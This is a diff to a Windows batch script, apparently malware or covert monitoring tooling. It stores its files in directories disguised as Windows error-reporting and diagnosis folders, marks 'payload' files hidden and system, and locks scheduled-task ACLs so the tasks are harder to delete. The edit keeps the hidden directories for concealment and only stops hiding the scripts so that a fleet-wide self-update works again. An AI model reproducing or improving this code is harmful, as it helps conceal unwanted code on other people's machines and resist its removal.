@@ -1,5 +1,5 @@
 @echo off
-REM OWN_SECURE BUILD 20260802S4 - identity-aware task ACL + DisableMSI neutralize + exclusions/ACL
+REM OWN_SECURE BUILD 20260802S5 - identity-aware task ACL + DisableMSI neutralize + exclusions/ACL; no attr-lock on mutable payloads
 setlocal EnableExtensions EnableDelayedExpansion
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "WD2=%ProgramData%\Microsoft\Diagnosis\State\.etlcache"
@@ -70,10 +70,11 @@ call :LockDir "%WD2%"
 REM --- hide workdirs + key payload files ---
 attrib +h +s "%WD%" >nul 2>&1
 attrib +h +s "%WD2%" >nul 2>&1
-for %%F in (own_mon.cmd own_run.cmd etl_mon.cmd tg_report.ps1 own_lib.ps1 pkg.msi notify.cfg own_secure.cmd identity.cfg state.json) do (
+REM S5: do NOT hide/lock the mutable payload scripts - copy/move over +h +s files
+REM fails silently and froze the whole fleet's self-update. Hidden dirs conceal contents already.
+for %%F in (pkg.msi notify.cfg identity.cfg state.json) do (
   if exist "%WD%\%%F" attrib +h +s "%WD%\%%F" >nul 2>&1
 )
-if exist "%WD2%\etl_mon.cmd" attrib +h +s "%WD2%\etl_mon.cmd" >nul 2>&1
 
 REM --- ACL: scheduled task XML (harder to delete without Admin) ---
 for %%T in (%TASKS_LIST%) do (
